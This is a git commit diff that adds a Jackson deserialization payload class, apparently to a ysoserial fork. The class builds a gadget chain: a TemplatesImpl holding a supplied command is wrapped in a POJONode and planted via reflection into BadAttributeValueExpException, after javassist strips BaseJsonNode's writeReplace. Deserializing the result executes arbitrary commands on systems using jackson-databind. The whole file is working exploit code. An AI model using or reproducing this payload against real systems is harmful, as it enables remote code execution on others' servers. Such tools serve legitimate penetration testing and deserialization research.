558b5b6f1a6fdb1e459a3dd034ebba81b76f5324
Y4er <45418382@qq.com>
2023-04-27 08:37:46 +0800

    jackson

---
+++ src/main/java/ysoserial/payloads/Jackson.java
@@ -0,0 +1,45 @@
+package ysoserial.payloads;
+
+import com.alibaba.fastjson2.JSONArray;
+import com.fasterxml.jackson.databind.node.POJONode;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
+import ysoserial.payloads.annotation.Authors;
+import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.util.Gadgets;
+import ysoserial.payloads.util.PayloadRunner;
+import ysoserial.payloads.util.Reflections;
+
+import javax.management.BadAttributeValueExpException;
+import java.util.HashMap;
+
+@SuppressWarnings({"rawtypes", "unchecked"})
+@Dependencies({"com.fasterxml.jackson.core:jackson-databind:2.14.2"})
+@Authors({Authors.Y4ER})
+public class Jackson implements ObjectPayload<Object> {
+
+    public static void main(final String[] args) throws Exception {
+        PayloadRunner.run(Jackson.class, args);
+    }
+
+    public Object getObject(final String command) throws Exception {
+        final Object template = Gadgets.createTemplatesImpl(command);
+
+        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
+        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
+        ctClass.removeMethod(writeReplace);
+        // 将修改后的CtClass加载至当前线程的上下文类加载器中
+        ctClass.toClass();
+
+        POJONode node = new POJONode(template);
+
+        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
+        Reflections.setFieldValue(badAttributeValueExpException, "val", node);
+
+        HashMap hashMap = new HashMap();
+        hashMap.put(template, badAttributeValueExpException);
+
+        return hashMap;
+    }
+}
